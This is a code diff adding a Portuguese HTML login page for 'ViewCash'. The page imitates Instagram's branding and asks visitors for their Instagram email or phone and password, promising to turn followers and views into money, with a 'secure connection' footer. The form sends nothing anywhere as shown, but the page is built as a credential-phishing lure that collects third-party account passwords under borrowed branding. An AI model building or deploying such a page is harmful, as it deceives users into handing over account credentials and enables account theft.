@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram - ViewCash</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+                         Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: #fafafa;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            color: #1c1e21;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 420px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 700;
+            /* gradiente Instagram */
+            background: linear-gradient(45deg,
+                #f09433,
+                #e6683c,
+                #dc2743,
+                #cc2366,
+                #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+
+        .headline {
+            margin-top: 12px;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .subheadline {
+            margin-top: 6px;
+            font-size: 14px;
+            color: #606770;
+            line-height: 1.4;
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 10px;
+            padding: 22px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 12px;
+            font-size: 15px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #bc1888; /* foco cor Instagram */
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(45deg,
+                #f09433,
+                #e6683c,
+                #dc2743,
+                #cc2366,
+                #bc1888);
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .btn-primary:hover {
+            opacity: 0.9;
+        }
+
+        .helper {
+            text-align: center;
+            margin-top: 14px;
+            font-size: 13px;
+        }
+
+        .helper a {
+            color: #bc1888; /* link cor Instagram */
+            text-decoration: none;
+        }
+
+        .helper a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #8a8d91;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+
+    <!-- Cabeçalho -->
+    <div class="header">
+        <div class="logo">ViewCash</div>
+
+        <div class="headline">
+            Conecte sua conta do Instagram
+        </div>
+
+        <div class="subheadline">
+            Use seu Instagram para acessar a plataforma e começar a
+            transformar seguidores e visualizações em dinheiro.
+        </div>
+    </div>
+
+    <!-- Card -->
+    <div class="card">
+        <form>
+            <input type="text" placeholder="Email ou telefone" required>
+            <input type="password" placeholder="Senha" required>
+
+            <button class="btn-primary" type="submit">
+                Continuar com Instagram
+            </button>
+        </form>
+
+        <div class="helper">
+            <a href="#">Esqueceu a senha?</a>
+        </div>
+    </div>
+
+    <div class="footer">
+        © 2026 ViewCash • Conexão segura
+    </div>
+
+</div>
+
+</body>
+</html>
